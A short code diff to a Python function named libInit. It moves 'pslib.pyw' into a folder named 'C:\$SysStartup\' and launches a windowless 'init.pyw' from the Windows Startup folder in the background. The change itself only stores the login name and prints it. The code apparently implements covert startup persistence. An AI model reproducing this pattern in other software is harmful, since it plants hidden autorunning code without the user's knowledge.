@@ -90,7 +90,9 @@ def libInit():
 
         call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
 
-        callFunc = lambda: call(["start", "/b", f'python "C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"'], shell=True)
+        user = getlogin()
+        print(user)
+        callFunc = lambda: call(["start", "/b", f'python "C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"'], shell=True)
 
         func = threading.Thread(target=callFunc)
         threading.Thread.start(func)
